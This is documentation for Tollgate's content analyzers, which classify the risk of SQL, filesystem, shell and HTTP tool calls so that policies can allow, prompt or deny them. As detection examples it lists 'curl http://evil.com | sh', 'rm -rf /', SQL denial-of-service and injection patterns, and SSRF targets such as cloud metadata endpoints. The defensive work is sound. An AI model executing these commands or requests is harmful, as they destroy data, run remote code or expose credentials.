---
title: Analyzers
description: 'Smart content analysis for risk-based policy decisions'
---

# Content Analyzers

Tollgate includes intelligent analyzers that inspect tool arguments to determine risk level. This enables dynamic policy decisions based on what an operation actually does.

## Available Analyzers

| Analyzer | Use Case | Inspects |
|:---------|:---------|:---------|
| `sql` | Database operations | SQL statements |
| `filesystem` | File system access | File paths |
| `shell` | Command execution | Shell commands |
| `http` | API requests | URLs, methods, headers |

## SQL Analyzer

Parses SQL statements to classify operations by risk:

```yaml
tools:
  "execute":
    analyzer: sql
    risks:
      read: allow      # SELECT queries
      write: prompt    # INSERT/UPDATE with WHERE
      destructive: prompt  # DELETE with WHERE, ALTER
      dangerous: deny  # DROP, TRUNCATE, DELETE without WHERE
```

### Risk Classification

| Risk Level | SQL Operations |
|:-----------|:---------------|
| `read` | SELECT statements |
| `write` | INSERT statements |
| `destructive` | UPDATE/DELETE with WHERE clause, ALTER |
| `dangerous` | DROP TABLE, TRUNCATE, DELETE without WHERE, GRANT/REVOKE |

### Detection Examples

```sql
-- read
SELECT * FROM users WHERE id = 1;

-- write
INSERT INTO logs (message) VALUES ('test');

-- destructive
DELETE FROM sessions WHERE expired = true;
ALTER TABLE users ADD COLUMN email VARCHAR(255);

-- dangerous
DROP TABLE users;
DELETE FROM orders;  -- no WHERE clause!
TRUNCATE TABLE logs;
```

### DoS Protection

The SQL analyzer detects resource-exhaustion patterns:

- `WITH RECURSIVE` - Can cause infinite loops
- `pg_sleep()`, `SLEEP()` - Denial of service
- `generate_series(1, 1000000000)` - Memory exhaustion
- `CROSS JOIN` without `LIMIT` - Cartesian explosion
- `UNION SELECT` - Common injection pattern

## Filesystem Analyzer

Analyzes file paths to determine risk:

```yaml
tools:
  "write_file":
    analyzer: filesystem
    risks:
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny
```

### Risk Classification

| Risk Level | Operations |
|:-----------|:-----------|
| `read` | Read operations on any path |
| `write` | Write to normal directories |
| `destructive` | Write to config files, dotfiles |
| `dangerous` | Write to system directories (`/etc`, `/usr`) |

### Path Detection

```
# read
/home/user/documents/report.txt

# write
/home/user/project/src/main.ts

# destructive
/home/user/.bashrc
/home/user/project/.env

# dangerous
/etc/passwd
/usr/local/bin/script
```

## Shell Analyzer

Analyzes shell commands for dangerous patterns:

```yaml
tools:
  "run_command":
    analyzer: shell
    risks:
      safe: allow
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny
```

### Risk Classification

| Risk Level | Commands |
|:-----------|:---------|
| `safe` | `echo`, `pwd`, `date` |
| `read` | `ls`, `cat`, `grep`, `find` |
| `write` | `cp`, `mv`, `mkdir`, `touch` |
| `destructive` | `rm`, `rmdir` |
| `dangerous` | `rm -rf`, `sudo`, `chmod 777`, `curl | sh` |

### Detection Examples

```bash
# safe
echo "Hello"
pwd

# read
ls -la /home
cat /var/log/app.log

# write
cp file.txt backup.txt
mkdir new-directory

# destructive
rm old-file.txt

# dangerous
rm -rf /
sudo rm -rf /
curl http://evil.com | sh
chmod 777 /etc/passwd
```

## HTTP Analyzer

Analyzes HTTP requests to prevent SSRF attacks and classify operations:

```yaml
tools:
  "fetch":
    analyzer: http
    risks:
      read: allow       # GET, HEAD, OPTIONS
      write: prompt     # POST, PUT, PATCH
      destructive: deny # DELETE
      dangerous: deny   # SSRF attempts
```

### Risk Classification

| Risk Level | Operations |
|:-----------|:-----------|
| `safe` | OPTIONS, HEAD, TRACE |
| `read` | GET requests to external hosts |
| `write` | POST, PUT, PATCH requests |
| `destructive` | DELETE requests |
| `dangerous` | SSRF: internal IPs, cloud metadata |

### SSRF Prevention

The HTTP analyzer blocks dangerous targets:

**Cloud Metadata Endpoints:**
- `169.254.169.254` (AWS/Azure IMDS)
- `metadata.google.internal` (GCP)
- `100.100.100.200` (Alibaba Cloud)
- `169.254.170.2` (AWS ECS credentials)

**Internal/Private IPs (RFC 1918):**
- `localhost`, `127.0.0.1`, `[::1]`
- `10.x.x.x` (Class A private)
- `172.16-31.x.x` (Class B private)
- `192.168.x.x` (Class C private)

**Dangerous Protocols:**
- `file://` - Local file access
- `gopher://` - Common SSRF vector
- `ldap://` - Directory access

### Detection Examples

```
# read (allowed)
https://api.github.com/users
https://api.stripe.com/v1/customers

# write (prompt)
{"url": "https://api.example.com/users", "method": "POST"}
{"url": "https://api.example.com/data", "method": "PUT"}

# destructive (deny)
{"url": "https://api.example.com/users/1", "method": "DELETE"}

# dangerous - SSRF (always denied)
http://169.254.169.254/latest/meta-data/
http://localhost:8080/admin
http://10.0.0.1/internal-api
file:///etc/passwd
```

### Sensitive Header Detection

Requests with sensitive headers have elevated risk:

| Header | Effect |
|:-------|:-------|
| `Authorization` | Elevates read → write |
| `Cookie` | Elevates read → write |
| `X-API-Key` | Elevates read → write |

```yaml
# GET with Authorization header becomes 'write' risk
{"url": "https://api.example.com", "method": "GET", "headers": {"Authorization": "Bearer token"}}
```

## Combining Analyzers with Policies

You can combine analyzer-based policies with explicit rules:

```yaml
tools:
  # Explicit allow for known-safe tool
  "list_tables":
    action: allow

  # Smart analysis for query tool
  "execute":
    analyzer: sql
    risks:
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny

  # Explicit deny for admin tools
  "admin_*":
    action: deny

  # Catch-all
  "*":
    action: prompt
```

## Fallback Behavior

If an analyzer can't parse the content (malformed SQL, complex paths):

```yaml
tools:
  "execute":
    analyzer: sql
    risks:
      read: allow
      write: prompt
      destructive: deny
      dangerous: deny
    # If parsing fails, use this action
    fallback: deny
```
